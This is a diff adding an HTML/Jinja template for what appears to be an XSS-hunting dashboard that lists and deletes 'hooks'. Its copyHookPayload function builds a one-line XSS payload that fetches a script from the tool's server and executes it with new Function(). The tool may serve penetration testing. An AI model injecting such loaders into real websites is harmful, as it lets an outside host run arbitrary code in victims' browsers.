@@ -1,0 +1,105 @@
+{% extends 'base.html' %}
+
+{% block title %}
+Hooks
+{% endblock %}
+
+{% block content %}
+<div class="to-right">
+    <button onclick="window.location ='{{  url_for('new_hook') }}'">
+        ➕
+    </button>
+</div>
+<table>
+    <thead>
+        <th>Name</th>
+        <th></th>
+    </thead>
+    <tbody>
+        {% for h in hooks %}
+        <tr>
+            <td>{{ h.name }}</td>
+            <td>
+                <button onclick="window.location ='{{  url_for('hook', id=h.id) }}'">👁</button>
+                <button onclick="deleteHook({{ h.id }})">🗑️</button>
+                <button onclick="copyHookPayload({{ h.xid }})">💉</button>
+            </td>
+        </tr>
+        {% endfor %}
+    </tbody>
+</table>
+<dialog id="dialog">
+    <header>Confirm</header>
+    <form method="dialog">
+        <p>Are you sure that you want to delete the hook ?</p>
+        <menu>
+            <button value="n">Cancel</button>
+            <button value="y" id="dialog-confirm">Confirm</button>
+        </menu>
+    </form>
+</dialog>
+<dialog id="info-dialog">
+    <header>Info</header>
+        <p id="info-dialog-text"></p>
+        <menu>
+            <button onclick="document.getElementById('info-dialog').close()">Ok</button>
+        </menu>
+</dialog>
+<script>
+    const showInfo = (text) => {
+        document.getElementById("info-dialog-text").innerText = text;
+        document.getElementById("info-dialog").showModal();
+    }
+    const deleteHook = (id) => {
+        window.hook_del_id = id;
+        document.getElementById("dialog").showModal();
+    };
+    window.addEventListener("DOMContentLoaded", () => {
+        document.getElementById("dialog-confirm").addEventListener("click", async () => {
+            let r = await fetch(`/hooks/${window.hook_del_id}`, {
+                method: "DELETE"
+            });
+            if (r.status != 200) {
+                alert(`An error occurred while deleting the hook (Code ${r.status})`);
+            } else {
+                window.location.reload();
+            }
+        });
+    });
+
+    function copyHookPayload(xid) {
+        function fallbackCopyTextToClipboard(text) {
+            var textArea = document.createElement("textarea");
+            textArea.value = text;
+            
+            // Avoid scrolling to bottom
+            textArea.style.top = "0";
+            textArea.style.left = "0";
+            textArea.style.position = "fixed";
+          
+            document.body.appendChild(textArea);
+            textArea.focus();
+            textArea.select();
+          
+            try {
+              var successful = document.execCommand('copy');
+              var msg = successful ? 'successful' : 'unsuccessful';
+            } catch (err) {
+            }
+          
+            document.body.removeChild(textArea);
+        }
+        function copyTextToClipboard(text) {
+            if (!navigator.clipboard) {
+              fallbackCopyTextToClipboard(text);
+              return;
+            }
+            navigator.clipboard.writeText(text).then(function() {
+            }, function(err) {
+            });
+        }
+        copyTextToClipboard(`fetch("${window.location.protocol}//${window.location.host}/${xid}/lib.js").then(async(r)=>{window.urc=r.url;new Function(await r.text())()})`);
+        showInfo("XSS copied to the clipboard");
+    }
+</script>
+{% endblock %}
